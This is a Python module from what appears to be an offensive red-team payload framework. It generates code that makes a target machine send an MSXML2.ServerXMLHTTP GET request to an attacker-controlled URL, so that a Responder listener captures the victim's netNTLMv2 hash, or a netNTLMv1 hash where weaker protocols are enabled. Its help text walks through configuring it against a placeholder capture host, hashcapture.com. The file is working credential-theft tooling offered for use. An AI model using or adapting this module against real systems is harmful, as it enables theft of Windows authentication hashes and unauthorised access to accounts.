from lib.core.specmodule import SpecModule
from lib.modhandlers.generic import quotedstring

class Spec(SpecModule):
    def __init__(self, templatepath, helpers):
        self.options = {}
        self.helpers = helpers
        self.help = """
        This module makes a MSXML2.ServerXMLHTTP.6.0 Get request towards the URL specified in the URL option
        and you need a responder listening on the address to capture the hash.

        Lets say you want to send the client to https://hashcapture.com
        set webserver_address hashcapture.com
        set url https://hashcapture.com
        run

        This should give you the netNTLMv2 hash in Responder
        If you are able to enable LM/netNTLMv1 support in the OS this can also be used to capture that.
        
        It uses MSXML2.ServerXMLHTTP.6.0
        - SetProxy
        - setRequestHeader
        - open
        - send
        """
        self.entry = 'capture_netntlmv2'
        self.depends = []
        self.options['webserver_address'] = {
            "value": None,
            "required": True,
            "description": "Main FQDN/IP of the server without HTTP/HTTPS - ex hashcapture.com",
            "handler": quotedstring
        }

        self.options['url'] = {
            "value": None,
            "required": True,
            "description": "Full url - ex https://hashcapture.com",
            "handler": quotedstring
        }
        self.options['useragent'] = {
            "value": None,
            "required": False,
            "description": "Useragent - Retrieved from DB",
            "handler": quotedstring
        }
        super().__init__(templatepath)
    def preprocess(self, agent):
        self.options['useragent']['value'] = agent.useragent